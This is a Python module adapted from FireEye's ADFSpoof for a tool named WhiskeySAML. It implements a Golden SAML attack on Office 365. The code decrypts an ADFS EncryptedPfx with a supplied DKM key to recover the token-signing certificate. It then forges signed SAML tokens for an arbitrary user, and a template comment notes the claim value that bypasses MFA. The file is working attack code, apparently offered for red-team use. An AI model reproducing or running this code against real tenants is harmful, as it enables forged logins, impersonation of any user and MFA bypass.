#    Copyright 2021 FireEye
#
#    Licensed under the Apache License, Version 2.0 (the "License");
#    you may not use this file except in compliance with the License.
#    You may obtain a copy of the License at
#
#        http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS,
#    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#    See the License for the specific language governing permissions and
#    limitations under the License.

# This code has been modified for the purposes of use with WhiskeySAML

import re
import struct
import random
import string
import base64
import logging

from lxml import etree  # type: ignore
from signxml import XMLSigner  # type: ignore
from datetime import datetime, timedelta

# This is using a modified version of the cryptography library
# to deal with the custom MS Key Deriviation
# https://github.com/dmb2168/cryptography
from cryptography.hazmat.backends import default_backend  # type: ignore
from cryptography.hazmat.primitives import hashes, hmac  # type: ignore
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # type: ignore
from cryptography.hazmat.primitives.serialization import pkcs12  # type: ignore
from cryptography.hazmat.primitives.kdf.kbkdf import (  # type: ignore
    CounterLocation,
    KBKDFHMAC,
    Mode,
)

from pyasn1.type.univ import ObjectIdentifier, OctetString  # type: ignore
from pyasn1.codec.der.decoder import decode as der_decode  # type: ignore
from pyasn1.codec.der.encoder import encode  # type: ignore


# Via: https://github.com/fireeye/ADFSpoof/blob/master/templates/o365.xml
# These are the Golden SAML templates
# MFA bypass is based on the attribute value
# for the attribute: `authnmethodsreferences`.
#   MFA Byass:    `http://schemas.microsoft.com/claims/multipleauthn`
#   MFA Required: `urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport`
o365_template = """<t:RequestSecurityTokenResponse xmlns:t="http://schemas.xmlsoap.org/ws/2005/02/trust"><t:Lifetime><wsu:Created xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$TokenCreated</wsu:Created><wsu:Expires xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$TokenExpires</wsu:Expires></t:Lifetime><wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy"><wsa:EndpointReference xmlns:wsa="http://www.w3.org/2005/08/addressing"><wsa:Address>urn:federation:MicrosoftOnline</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><t:RequestedSecurityToken><saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion" MajorVersion="1" MinorVersion="1" AssertionID="$AssertionID" Issuer="$AdfsServer" IssueInstant="$TokenCreated"><saml:Conditions NotBefore="$TokenCreated" NotOnOrAfter="$TokenExpires"><saml:AudienceRestrictionCondition><saml:Audience>urn:federation:MicrosoftOnline</saml:Audience></saml:AudienceRestrictionCondition></saml:Conditions><saml:AttributeStatement><saml:Subject><saml:NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">$NameIdentifier</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject><saml:Attribute AttributeName="UPN" AttributeNamespace="http://schemas.xmlsoap.org/claims"><saml:AttributeValue>$UPN</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeName="ImmutableID" AttributeNamespace="http://schemas.microsoft.com/LiveID/Federation/2008/05"><saml:AttributeValue>$NameIdentifier</saml:AttributeValue></saml:Attribute><saml:Attribute xmlns:a="http://schemas.xmlsoap.org/ws/2009/09/identity/claims" AttributeName="insidecorporatenetwork" AttributeNamespace="http://schemas.microsoft.com/ws/2012/01" a:OriginalIssuer="CLIENT CONTEXT"><saml:AttributeValue xmlns:tn="http://www.w3.org/2001/XMLSchema" xmlns:b="http://www.w3.org/2001/XMLSchema-instance" b:type="tn:boolean">false</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeName="authnmethodsreferences" AttributeNamespace="http://schemas.microsoft.com/claims"><saml:AttributeValue>http://schemas.microsoft.com/claims/multipleauthn</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthenticationStatement AuthenticationMethod="urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport" AuthenticationInstant="$TokenCreated"><saml:Subject><saml:NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">$NameIdentifier</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject></saml:AuthenticationStatement><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature></saml:Assertion></t:RequestedSecurityToken><t:TokenType>urn:oasis:names:tc:SAML:1.0:assertion</t:TokenType><t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType><t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType></t:RequestSecurityTokenResponse>"""
# o365_template = """<t:RequestSecurityTokenResponse xmlns:t="http://schemas.xmlsoap.org/ws/2005/02/trust"><t:Lifetime><wsu:Created xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$TokenCreated</wsu:Created><wsu:Expires xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$TokenExpires</wsu:Expires></t:Lifetime><wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy"><wsa:EndpointReference xmlns:wsa="http://www.w3.org/2005/08/addressing"><wsa:Address>urn:federation:MicrosoftOnline</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><t:RequestedSecurityToken><saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:1.0:assertion" MajorVersion="1" MinorVersion="1" AssertionID="$AssertionID" Issuer="$AdfsServer" IssueInstant="$TokenCreated"><saml:Conditions NotBefore="$TokenCreated" NotOnOrAfter="$TokenExpires"><saml:AudienceRestrictionCondition><saml:Audience>urn:federation:MicrosoftOnline</saml:Audience></saml:AudienceRestrictionCondition></saml:Conditions><saml:AttributeStatement><saml:Subject><saml:NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">$NameIdentifier</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject><saml:Attribute AttributeName="UPN" AttributeNamespace="http://schemas.xmlsoap.org/claims"><saml:AttributeValue>$UPN</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeName="ImmutableID" AttributeNamespace="http://schemas.microsoft.com/LiveID/Federation/2008/05"><saml:AttributeValue>$NameIdentifier</saml:AttributeValue></saml:Attribute><saml:Attribute xmlns:a="http://schemas.xmlsoap.org/ws/2009/09/identity/claims" AttributeName="insidecorporatenetwork" AttributeNamespace="http://schemas.microsoft.com/ws/2012/01" a:OriginalIssuer="CLIENT CONTEXT"><saml:AttributeValue xmlns:tn="http://www.w3.org/2001/XMLSchema" xmlns:b="http://www.w3.org/2001/XMLSchema-instance" b:type="tn:boolean">false</saml:AttributeValue></saml:Attribute><saml:Attribute AttributeName="authnmethodsreferences" AttributeNamespace="http://schemas.microsoft.com/claims"><saml:AttributeValue>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthenticationStatement AuthenticationMethod="urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport" AuthenticationInstant="$TokenCreated"><saml:Subject><saml:NameIdentifier Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">$NameIdentifier</saml:NameIdentifier><saml:SubjectConfirmation><saml:ConfirmationMethod>urn:oasis:names:tc:SAML:1.0:cm:bearer</saml:ConfirmationMethod></saml:SubjectConfirmation></saml:Subject></saml:AuthenticationStatement><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature></saml:Assertion></t:RequestedSecurityToken><t:TokenType>urn:oasis:names:tc:SAML:1.0:assertion</t:TokenType><t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType><t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType></t:RequestSecurityTokenResponse>"""


# https://github.com/fireeye/ADFSpoof/blob/master/ADFSpoof.py
def get_signer(cert, key):
    pfx = EncryptedPFX(cert, key)
    decrypted_pfx = pfx.decrypt_pfx()
    signer = SAMLSigner(decrypted_pfx, o365_template)
    return signer


def get_module_params(server, upn, guid):
    now = datetime.utcnow()
    hour = timedelta(hours=1)
    token_created = (now).strftime("%Y-%m-%dT%H:%M:%S.000Z")
    token_expires = (now + hour).strftime("%Y-%m-%dT%H:%M:%S.000Z")

    immutable_id = encode_object_guid(guid).decode("ascii")
    assertion_id = random_string()

    # We are only targeting O365
    params = {
        "TokenCreated": token_created,
        "TokenExpires": token_expires,
        "UPN": upn,
        "NameIdentifier": immutable_id,
        "AssertionID": assertion_id,
        "AdfsServer": server,
    }
    name_identifier = "AssertionID"

    return params, name_identifier


# https://github.com/fireeye/ADFSpoof/blob/master/utils.py
def random_string():
    return "_" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))


def new_guid(stream):
    guid = []
    guid.append(stream[3] << 24 | stream[2] << 16 | stream[1] << 8 | stream[0])
    guid.append(stream[5] << 8 | stream[4])
    guid.append(stream[7] << 8 | stream[6])
    guid.append(stream[8])
    guid.append(stream[9])
    guid.append(stream[10])
    guid.append(stream[11])
    guid.append(stream[12])
    guid.append(stream[13])
    guid.append(stream[14])
    guid.append(stream[15])
    return guid


def encode_object_guid(guid):
    guid = guid.replace("}", "").replace("{", "")
    guid_parts = guid.split("-")
    hex_string = (
        guid_parts[0][6:]
        + guid_parts[0][4:6]
        + guid_parts[0][2:4]
        + guid_parts[0][0:2]
        + guid_parts[1][2:]
        + guid_parts[1][0:2]
        + guid_parts[2][2:]
        + guid_parts[2][0:2]
        + guid_parts[3]
        + guid_parts[4]
    )
    hex_array = bytearray.fromhex(hex_string)
    immutable_id = base64.b64encode(hex_array)
    return immutable_id


# https://github.com/fireeye/ADFSpoof/blob/master/SamlSigner.py
class SAMLSigner:
    def __init__(self, data, template=None, password=None):
        self.key, self.cert = self.load_pkcs12(data, password)
        self.saml_template = template

    def load_pkcs12(self, data, password):
        cert = pkcs12.load_key_and_certificates(data, password, default_backend())
        return cert[0], cert[1]

    def sign_XML(self, params, id_attribute, algorithm, digest):
        logging.info(f"\tBuilding and signing Golden SAML")

        saml_string = string.Template(self.saml_template).substitute(params)
        data = etree.fromstring(saml_string)

        signed_xml = XMLSigner(
            c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
            signature_algorithm=algorithm,
            digest_algorithm=digest,
        ).sign(
            data,
            key=self.key,
            cert=[self.cert],
            reference_uri=params.get("AssertionID"),
            id_attribute=id_attribute,
        )
        signed_saml_string = etree.tostring(signed_xml).replace(b"\n", b"")
        signed_saml_string = re.sub(
            b"-----(BEGIN|END) CERTIFICATE-----", b"", signed_saml_string
        )

        logging.debug(f"\tSigned SAML String:\n{signed_saml_string}")

        return signed_saml_string


# https://github.com/fireeye/ADFSpoof/blob/master/EncryptedPfx.py
class EncryptedPFX:
    def __init__(self, blob, key, debug=False):
        self.DEBUG = debug
        self.decryption_key = key
        self._raw = blob
        self.decode()

    def decrypt_pfx(self):
        logging.info(f"\tDeriving decryption keys from DKM")

        self._derive_keys(self.decryption_key)
        self._verify_ciphertext()

        logging.info(f"\tDecrypting EncryptedPfx")

        backend = default_backend()
        iv = self.iv.asOctets()
        cipher = Cipher(
            algorithms.AES(self.encryption_key), modes.CBC(iv), backend=backend
        )
        decryptor = cipher.decryptor()
        plain_pfx = decryptor.update(self.ciphertext) + decryptor.finalize()

        logging.debug(f"\tDecrypted PFX:\n{plain_pfx}")

        return plain_pfx

    def _verify_ciphertext(self):
        backend = default_backend()
        h = hmac.HMAC(self.mac_key, hashes.SHA256(), backend=backend)
        stream = self.iv.asOctets() + self.ciphertext
        h.update(stream)
        mac_code = h.finalize()

        if mac_code != self.mac:
            logging.error("Calculated MAC did not match anticipated MAC")
            logging.error(f"Calculated MAC: {mac_code}")
            logging.error(f"Expected MAC:   {self.mac}")
            raise ValueError("invalid mac")

        logging.debug(f"MAC Calculated over IV and Ciphertext: {mac_code}")

    def _derive_keys(self, password=None):
        label = encode(self.encryption_oid) + encode(self.mac_oid)
        context = self.nonce.asOctets()
        backend = default_backend()

        kdf = KBKDFHMAC(
            algorithm=hashes.SHA256(),
            mode=Mode.CounterMode,
            length=48,
            rlen=4,
            llen=4,
            location=CounterLocation.BeforeFixed,
            label=label,
            context=context,
            fixed=None,
            backend=backend,
        )

        key = kdf.derive(password)
        logging.debug(f"Derived key: {key}")

        self.encryption_key = key[0:16]
        self.mac_key = key[16:]

    def _decode_octet_string(self, remains=None):
        if remains:
            buff = remains
        else:
            buff = self._raw[8:]
        octet_string, remains = der_decode(buff, OctetString())

        return octet_string, remains

    def _decode_length(self, buff):
        bytes_read = 1
        length_initial = buff[0]
        if length_initial < 127:
            length = length_initial

        else:
            length_initial &= 127
            input_arr = []
            for x in range(0, length_initial):
                input_arr.append(buff[x + 1])
                bytes_read += 1
            length = input_arr[0]
            for x in range(1, length_initial):
                length = input_arr[x] + (length << 8)

        logging.debug(f"Decoded length: {length}")
        return length, buff[bytes_read:]

    def _decode_groupkey(self):
        octet_stream, remains = self._decode_octet_string()

        guid = new_guid(octet_stream)

        logging.debug(f"Decoded GroupKey GUID: {guid}")
        return guid, remains

    def _decode_authencrypt(self, buff):
        _, remains = der_decode(buff, ObjectIdentifier())
        mac_oid, remains = der_decode(remains, ObjectIdentifier())
        encryption_oid, remains = der_decode(remains, ObjectIdentifier())

        logging.debug("Decoded Algorithm OIDS:")
        logging.debug(f"\tEncryption Algorithm OID: {encryption_oid}")
        logging.debug(f"\tMAC Algorithm OID:        {mac_oid}")
        return encryption_oid, mac_oid, remains

    def decode(self):
        version = struct.unpack(">I", self._raw[0:4])[0]
        if version != 1:
            logging.error("Version should be 1.")
            raise ValueError("invalid EncryptedPfx version")

        method = struct.unpack(">I", self._raw[4:8])[0]
        if method != 0:
            logging.error("Not using EncryptThenMAC (0).")
            raise ValueError(f"unsupported EncryptedPfx method found: {method}")

        self.guid, remains = self._decode_groupkey()
        self.encryption_oid, self.mac_oid, remains = self._decode_authencrypt(remains)
        self.nonce, remains = self._decode_octet_string(remains)
        self.iv, remains = self._decode_octet_string(remains)
        self.mac_length, remains = self._decode_length(remains)
        self.ciphertext_length, remains = self._decode_length(remains)
        self.ciphertext = remains[: self.ciphertext_length - self.mac_length]
        self.mac = remains[self.ciphertext_length - self.mac_length :]

        logging.debug(f"Decoded nonce:             {self.nonce.asOctets()}")
        logging.debug(f"Decoded IV:                {self.iv.asOctets()}")
        logging.debug(f"Decoded MAC length:        {self.mac_length}")
        logging.debug(f"Decoded MAC:               {self.mac}")
        logging.debug(f"Decoded Ciphertext length: {self.ciphertext_length}")
        logging.debug(f"Decoded Ciphertext:\n{self.ciphertext}")
